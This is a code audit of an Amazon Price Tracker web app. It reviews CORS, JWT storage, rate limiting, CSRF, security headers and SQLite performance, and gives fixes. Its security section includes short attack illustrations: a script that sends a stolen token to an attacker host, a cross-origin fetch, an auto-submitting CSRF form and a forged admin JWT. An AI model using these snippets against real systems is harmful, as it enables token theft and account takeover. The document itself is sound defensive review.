# Improvements & Optimization Opportunities

**Date:** 2026-04-10
**Purpose:** Point-in-time audit of the Amazon Price Tracker codebase identifying potential issues, optimization opportunities, and areas for improvement. Each item includes current behavior analysis with code references, impact assessment, and concrete fix suggestions.

**Severity Scale:**
- **Critical** — Security vulnerability or data loss risk requiring immediate attention
- **High** — Significant limitation affecting reliability, scalability, or security
- **Medium** — Improvement that would meaningfully benefit the application
- **Low** — Nice-to-have optimization or best practice alignment

---

## 1. Security

The application implements core security fundamentals (bcrypt password hashing, JWT authentication, parameterized SQL queries, user data isolation). However, several areas could be hardened — particularly around CORS, token storage, and rate limiting — especially as the app moves toward multi-user production use.

### 1.1 `[High]` CORS Allows All Origins

**Current behavior:** The Express server accepts requests from any origin.

```typescript
// backend/src/server.ts:25-30
app.use(cors({
  origin: true,  // Allow all origins in development
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**Impact:** Any website can make authenticated API requests on behalf of a logged-in user. If an attacker hosts a malicious page and a user visits it while logged in, the attacker's JavaScript can call the API with the user's credentials — reading their product data, triggering scrapes, modifying settings, or (for admins) managing other users.

**Example scenario:** A user visits `evil-site.com` while logged into the tracker. The page runs:
```javascript
fetch('https://tracker.example.com/api/products', {
  credentials: 'include',
  headers: { 'Authorization': 'Bearer ' + storedToken }
})
```
This succeeds because the server returns `Access-Control-Allow-Origin: evil-site.com`.

**Suggested fix:** Configure allowed origins from an environment variable with a safe default:
```typescript
const allowedOrigins = process.env.ALLOWED_ORIGINS
  ? process.env.ALLOWED_ORIGINS.split(',')
  : ['http://localhost:5174'];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS not allowed'));
    }
  },
  credentials: true,
}));
```

### 1.2 `[High]` JWT Stored in localStorage

**Current behavior:** The JWT token is stored in and read from `localStorage`.

```typescript
// frontend/src/contexts/AuthContext.tsx:43
const storedToken = localStorage.getItem('authToken');

// frontend/src/contexts/AuthContext.tsx:66
localStorage.setItem('authToken', response.token);
```

**Impact:** `localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the app (e.g., unsanitized user input rendered in the DOM, a compromised dependency, or a browser extension), the attacker can read the JWT and use it from any location — the token works until it expires (7 days by default).

**Example scenario:** A browser extension or injected script runs:
```javascript
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?token=' + token);
```
The attacker now has full API access for up to 7 days.

**Suggested fix:** Move to `httpOnly` cookies for token storage. The backend sets the cookie on login:
```typescript
res.cookie('token', jwt, {
  httpOnly: true,    // JavaScript cannot read it
  secure: true,      // HTTPS only
  sameSite: 'strict', // No cross-site requests
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```
The frontend stops storing/sending tokens manually — the browser sends the cookie automatically. This requires updating the auth middleware to read from `req.cookies` instead of the `Authorization` header.

### 1.3 `[Medium]` No Rate Limiting on Login/Register

**Current behavior:** The `/api/auth/login` and `/api/auth/register` endpoints have no rate limiting. Only `/api/admin/*` and `/api/setup/*` routes are rate-limited.

```typescript
// backend/src/routes/admin.ts:10-16 — rate limited
const adminRateLimit = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
});

// backend/src/routes/auth.ts — NO rate limiter imported or applied
router.post('/login', async (req, res) => { ... });
router.post('/register', async (req, res) => { ... });
```

**Impact:** An attacker can attempt unlimited login attempts to brute-force passwords. With no delay or lockout, even a moderately strong password can be cracked given enough time. Similarly, unrestricted registration could be used to create spam accounts.

**Example scenario:** An automated script sends 1000 login attempts per second against a known username, cycling through a password dictionary. With no rate limiting, this runs unimpeded.

**Suggested fix:** Add rate limiting to auth routes:
```typescript
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20,                   // 20 attempts per window
  message: { error: 'Too many attempts. Please try again later.' },
  standardHeaders: true,
});

router.post('/login', authLimiter, async (req, res) => { ... });
router.post('/register', authLimiter, async (req, res) => { ... });
```

### 1.4 `[Medium]` No CSRF Protection

**Current behavior:** State-changing requests (POST, PUT, DELETE) have no CSRF token validation. The app relies on the `Authorization` header for authentication, which provides some implicit CSRF protection since browsers don't automatically send custom headers cross-origin. However, if CORS is permissive (see item 1.1) or if token storage moves to cookies (see item 1.2), CSRF becomes a real attack vector.

**Impact:** If CORS is fixed but tokens move to httpOnly cookies (recommended in item 1.2), cross-site requests would automatically include the cookie. Without CSRF protection, a malicious page could trigger state changes (delete products, change passwords) on behalf of a logged-in user.

**Example scenario:** After moving to httpOnly cookies, a page at `evil-site.com` includes:
```html
<form action="https://tracker.example.com/api/products/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

**Suggested fix:** Implement the Synchronizer Token Pattern or use the `csurf` middleware (or its successor `csrf-csrf`). Alternatively, use the `SameSite=Strict` cookie attribute (as suggested in 1.2) which blocks cross-site cookie sending entirely — this is often sufficient for same-origin SPAs.

### 1.5 `[Medium]` JWT Secret Has a Working Default

**Current behavior:** The JWT secret defaults to a known string in development. The app warns but continues running.

```typescript
// backend/src/config.ts:32-39
const jwtSecret = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
if (isProduction && jwtSecret === 'your-secret-key-change-in-production') {
  console.error('FATAL: ...');
  process.exit(1);
}
if (jwtSecret === 'your-secret-key-change-in-production') {
  console.warn('WARNING: Using default JWT_SECRET...');
}
```

**Impact:** In development, any developer who knows the codebase can forge JWT tokens. If someone accidentally runs the dev config exposed to the network (e.g., via Tailscale without realizing), tokens can be forged by anyone who reads the source code. The production guard is good, but the dev default is still risky for Tailscale-accessible instances.

**Example scenario:** A developer runs the app on Tailscale without setting `NODE_ENV=production`. Another Tailscale user crafts a valid JWT:
```javascript
jwt.sign({ userId: 1, username: 'admin', role: 'ADMIN' },
         'your-secret-key-change-in-production', { expiresIn: '7d' });
```

**Suggested fix:** Generate a random secret on first run and persist it to a `.env` file or the database's `system_config` table. This way every installation has a unique secret even in development. The setup wizard could handle this automatically.

### 1.6 `[Low]` No Security Headers

**Current behavior:** No security-related HTTP headers are set. There's no Helmet middleware or manual header configuration.

**Impact:** The application is missing standard protections:
- No `Content-Security-Policy` — allows inline scripts, which aids XSS attacks
- No `X-Frame-Options` / `frame-ancestors` — the app can be embedded in iframes (clickjacking)
- No `Strict-Transport-Security` — browsers don't enforce HTTPS on subsequent visits
- No `X-Content-Type-Options` — browsers may MIME-sniff responses incorrectly

**Example scenario:** An attacker embeds the tracker in an iframe on their site, overlays invisible buttons, and tricks users into clicking actions they didn't intend (clickjacking).

**Suggested fix:** Install and configure Helmet:
```bash
npm install helmet
```
```typescript
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      imgSrc: ["'self'", "https://m.media-amazon.com", "https://images-na.ssl-images-amazon.com"],
      scriptSrc: ["'self'"],
    },
  },
}));
```

### Recommended Next Steps
1. **Immediate:** Add rate limiting to `/api/auth/login` and `/api/auth/register` — low effort, high security impact
2. **Immediate:** Restrict CORS origins via environment variable — low effort, closes the biggest hole
3. **Short-term:** Add Helmet for security headers — one dependency, broad protection
4. **Medium-term:** Migrate token storage to httpOnly cookies with `SameSite=Strict` — closes XSS token theft and CSRF simultaneously
5. **Medium-term:** Auto-generate JWT secret on first run via setup wizard

---

## 2. Database & Storage

SQLite is a solid choice for this application's scale — single-file, zero-config, and fast for read-heavy workloads. The database layer uses parameterized queries throughout (good for security) and has a well-organized repo pattern. The main concerns are around unbounded growth, missing WAL mode for concurrent access, and query efficiency at scale.

### 2.1 `[High]` Price History Grows Unbounded

**Current behavior:** Every price change creates a new row in `price_history`. There is no retention policy, archival mechanism, or compaction strategy anywhere in the codebase.

```typescript
// backend/src/services/db/product-repo.ts:265-267
'SELECT * FROM price_history WHERE product_id = ? ORDER BY date DESC',
```

**Impact:** A product tracked daily for 2 years generates ~730 rows. At scale: 50 users x 80 products x 365 days = 1.46 million rows per year. Each row is ~100 bytes, so price_history alone reaches ~140MB/year. The `getPriceHistory()` query fetches ALL rows with no LIMIT — chart rendering slows as history grows. Database exports become impractically large.

**Example scenario:**
```sql
-- After 1 year with 50 users, 80 products avg:
SELECT COUNT(*) FROM price_history;
-- Result: ~1,460,000 rows

-- ProductDetail page runs this on every load:
SELECT * FROM price_history WHERE product_id = 42 ORDER BY date DESC;
-- Returns 730 rows when 20-30 would suffice for the chart
```

**Suggested fix:**
1. Add a `LIMIT` and date range to `getPriceHistory()`:
   ```typescript
   'SELECT * FROM price_history WHERE product_id = ? AND date >= ? ORDER BY date DESC LIMIT ?'
   ```
2. Add a `retention_days` setting to `system_config` (default: 365)
3. Create a scheduled cleanup job that deletes records older than the retention period
4. For long-term history, consider a compaction job: keep daily granularity for last 90 days, weekly averages beyond that

### 2.2 `[Medium]` SQLite Not in WAL Mode

**Current behavior:** No `PRAGMA journal_mode` is set anywhere. SQLite defaults to DELETE journal mode, which uses exclusive locks during writes — blocking all readers.

```typescript
// backend/src/services/db/migrations.ts — PRAGMA usage is only for table_info introspection:
const columns = await dbAll<{ name: string }>(db, 'PRAGMA table_info(users)');
// No PRAGMA journal_mode = WAL anywhere
```

**Impact:** When the scheduler writes price records (which can take minutes for large catalogs), all read queries (dashboard, product listing, search) are blocked until the write transaction completes. This causes visible latency spikes for users during scheduled updates.

**Example scenario:** The scheduler updates 100 products (~200 seconds). During this window, a user loading the dashboard triggers `SELECT` queries that wait behind the write lock. The page appears to hang.

**Suggested fix:** Enable WAL mode on database initialization:
```typescript
db.run('PRAGMA journal_mode = WAL');
db.run('PRAGMA busy_timeout = 5000'); // Wait up to 5s for locks instead of failing
```
WAL mode allows concurrent readers during writes. The tradeoff is slightly more disk usage (WAL + SHM files) and checkpoint overhead — negligible for this workload.

### 2.3 `[Medium]` No VACUUM Strategy

**Current behavior:** When products are deleted (including cascade-deleted price history), SQLite doesn't reclaim disk space. The database file only grows, never shrinks.

**Impact:** After bulk operations (e.g., deleting a user with hundreds of products, or cleaning up old data), the database file retains its peak size. Over time, this wastes disk space — the file may be 500MB but only contain 200MB of live data.

**Example scenario:** An admin deletes a test user who had 200 products with 2 years of price history (~146,000 rows deleted). The database file stays the same size. Over months of user churn, significant space is wasted.

**Suggested fix:** Add a periodic VACUUM or use auto_vacuum:
```typescript
// Option 1: Incremental auto-vacuum (set once, on DB creation)
db.run('PRAGMA auto_vacuum = INCREMENTAL');
// Then periodically:
db.run('PRAGMA incremental_vacuum(100)'); // Free 100 pages at a time

// Option 2: Manual VACUUM after large deletes (admin-triggered)
// Add a "Compact Database" button in the admin panel
```
Note: Full `VACUUM` requires temporarily doubling disk space and locks the database. Incremental is safer for a running application.

### 2.4 `[Medium]` getPriceHistory() Fetches All Rows

**Current behavior:** The product detail page loads the entire price history for a product with no pagination or date range.

```typescript
// backend/src/services/db/product-repo.ts:262-267
async getPriceHistory(productId: number): Promise<PriceHistory[]> {
  return dbAll<PriceHistory>(
    db,
    'SELECT * FROM price_history WHERE product_id = ? ORDER BY date DESC',
    [productId]
  );
},
```

**Impact:** For a product tracked for 2 years, this returns ~730 rows every time the detail page loads. The frontend chart (Recharts) renders all data points, which is slow and visually noisy — users typically care about the last 30-90 days.

**Example scenario:** A user clicks on a product tracked since launch. The API returns 730 price records. The chart tries to render 730 data points with tooltips and hover states. On mobile, this causes noticeable lag.

**Suggested fix:** Add optional query parameters for date range and limit:
```typescript
async getPriceHistory(productId: number, options?: { days?: number; limit?: number }): Promise<PriceHistory[]> {
  const days = options?.days ?? 90;
  const limit = options?.limit ?? 500;
  return dbAll<PriceHistory>(
    db,
    'SELECT * FROM price_history WHERE product_id = ? AND date >= date("now", ?) ORDER BY date DESC LIMIT ?',
    [productId, `-${days} days`, limit]
  );
},
```
Add a "Show all history" toggle on the frontend for users who want the full dataset.

### 2.5 `[Low]` Image URLs Never Refreshed

**Current behavior:** Product image URLs are scraped once when the product is added and stored in the `products` table. They're never updated, even during daily price scrapes.

**Impact:** Amazon CDN URLs can expire or change over time. After months, some product images may show broken image placeholders. The frontend has an `onError` fallback, but it results in a poor visual experience.

**Example scenario:** A product added 6 months ago has an image URL pointing to an expired Amazon CDN path. The thumbnail shows a broken image icon on the dashboard.

**Suggested fix:** During price updates, also scrape and compare the image URL. If it changed, update the `products` table. This adds minimal overhead since the page is already loaded for price scraping:
```typescript
if (scrapedImageUrl && scrapedImageUrl !== product.image_url) {
  await dbService.updateProductImage(product.id, scrapedImageUrl);
}
```

### 2.6 `[Low]` No Composite Index on price_history(product_id, date)

**Current behavior:** There's an index on `price_history(product_id)` but not on the combination of `product_id` and `date`.

```typescript
// backend/src/services/db/migrations.ts:314
'CREATE INDEX IF NOT EXISTS idx_product_id ON price_history(product_id)',
// No composite index with date
```

**Impact:** Queries that filter by both `product_id` and a date range (as suggested in item 2.4) would benefit from a composite index. Without it, SQLite uses the product_id index to find all rows for the product, then scans those rows to apply the date filter. For products with thousands of history records, this adds unnecessary I/O.

**Example scenario:**
```sql
-- With only idx_product_id, this does an index scan + row filter:
SELECT * FROM price_history WHERE product_id = 42 AND date >= '2025-01-01'
ORDER BY date DESC LIMIT 90;

-- With a composite index, it's a direct range scan:
CREATE INDEX idx_price_history_product_date ON price_history(product_id, date DESC);
```

**Suggested fix:** Add a composite index in migrations:
```typescript
'CREATE INDEX IF NOT EXISTS idx_price_history_product_date ON price_history(product_id, date DESC)',
```
The `DESC` ordering matches the typical query pattern (most recent first). This also covers the existing `product_id`-only queries, so `idx_product_id` could be removed to save write overhead.

### Recommended Next Steps
1. **Immediate:** Add `LIMIT` and date range to `getPriceHistory()` — quick fix, big impact on page load times
2. **Immediate:** Enable WAL mode — single PRAGMA, eliminates read blocking during writes
3. **Short-term:** Add the composite `(product_id, date DESC)` index — one migration line
4. **Medium-term:** Implement price history retention policy with a configurable `retention_days` setting
5. **Long-term:** Add admin-triggered VACUUM or auto-vacuum for disk space reclamation
